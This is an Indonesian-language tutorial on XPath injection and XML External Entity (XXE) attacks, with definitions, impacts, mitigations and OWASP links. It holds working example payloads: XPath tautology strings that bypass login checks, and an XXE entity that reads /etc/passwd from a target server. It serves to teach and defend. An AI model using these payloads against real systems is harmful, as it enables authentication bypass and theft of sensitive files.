# XPath Injection & XXE

## XPath Injection

XPath Injection adalah serangan yang memanipulasi query XPath untuk mendapatkan akses tidak sah  
terhadap data yang disimpan dalam dokumen XML.

### Contoh Payload

'test' or '1'='1'

'test' or id='2'

Jika digunakan pada input login, query XPath bisa jadi:

```xpath
/users/user[username='test' or '1'='1']
```

Akibatnya, attacker bisa login tanpa password yang benar.

## XML External Entity Attacks (XXE)

XXE adalah serangan yang mengeksploitasi fitur *entities* di dalam XML parser.

### Contoh XXE (Internal Entity)

```xml
<!DOCTYPE test [
  <!ENTITY internal-entity "kebaikan">
]>
```

Kemudian digunakan dalam XML:

```xml
<data>&internal-entity;</data>
```

Output: `kebaikan`

### Contoh XXE (File Disclosure)

```xml
<!DOCTYPE test [
  <!ENTITY internal-entity SYSTEM "file:///etc/passwd">
]>
```

Kemudian dipanggil:

```xml
<data>&internal-entity;</data>
```

Ini akan membaca isi file `/etc/passwd` dari server target  
(jika parser rentan dan mengizinkan akses file system).

## Dampak XXE

- Membaca file sensitif (misalnya: `/etc/passwd`, credential, token)

- Denial of Service (contohnya: billion laughs attack)

- SSRF (Server-Side Request Forgery)

- Remote Code Execution (pada parser tertentu)

## Mitigasi XPath Injection & XXE

- Gunakan parser XML yang aman dan non-vulnerable

- Matikan fitur DOCTYPE dan entity resolution jika tidak digunakan

- Validasi dan escape input user sebelum digunakan dalam query XPath

- Gunakan JSON jika tidak butuh XML

## 📚 Belajar

[OWASP: XML External Entities (XXE)](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html)

[OWASP: XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
